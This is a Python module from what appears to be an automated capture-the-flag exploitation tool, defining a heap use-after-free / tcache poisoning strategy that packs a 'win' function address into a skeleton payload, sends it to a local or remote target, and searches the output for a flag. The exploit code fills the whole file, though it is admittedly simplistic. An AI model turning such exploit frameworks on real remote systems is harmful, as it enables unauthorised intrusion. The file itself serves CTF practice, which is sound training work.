"""
Penterous — Heap Use-After-Free exploit strategy (basic tcache/fastbin).
"""
import time
from strategies.base import ExploitStrategy, ExploitResult, _ensure_flag_txt
from utils.logger import info, success, warning, error


class HeapUAFStrategy(ExploitStrategy):
    """
    Use-After-Free / double-free attack targeting tcache/fastbin.
    Requires: malloc/free pattern + UAF primitive in binary.
    """

    def execute(self, mode: str = 'local', host: str = None, port: int = None) -> ExploitResult:
        start = time.time()
        strategy = 'heap_uaf'
        warning("Heap UAF strategy requires manual interaction — generating skeleton exploit")

        payload = self._build_uaf_payload()

        tube = self._get_tube(mode, host, port)
        if tube is None:
            return self._make_result(False, None, strategy, payload, b'', start,
                                     "Failed to create tube", mode=mode)

        output = self._send_and_receive(tube, payload, interactive_shell=True)
        flag = self.hunter.hunt(output)

        return self._make_result(
            success_=flag is not None,
            flag=flag,
            strategy=strategy,
            payload=payload,
            output=output,
            start_time=start,
            mode=mode,
            host=host or '',
            port=port or 0,
            error_msg="" if flag else "Heap UAF requires manual tuning for this binary",
        )

    def _build_uaf_payload(self) -> bytes:
        """
        Build a basic heap UAF payload sequence.
        Strategy: alloc chunk A, free A, use A (dangling pointer) to overwrite metadata.
        """
        info("Building UAF payload skeleton...")
        if self.binary.bits == 64:
            # Typical tcache poisoning: overwrite fd pointer with target address
            target = 0
            if self.binary.win_functions:
                _, target = self.binary.win_functions[0]
            import struct
            # Simplified: send fake chunk fd
            return struct.pack('<Q', target) * 4
        else:
            import struct
            target = 0
            if self.binary.win_functions:
                _, target = self.binary.win_functions[0]
            return struct.pack('<I', target) * 4
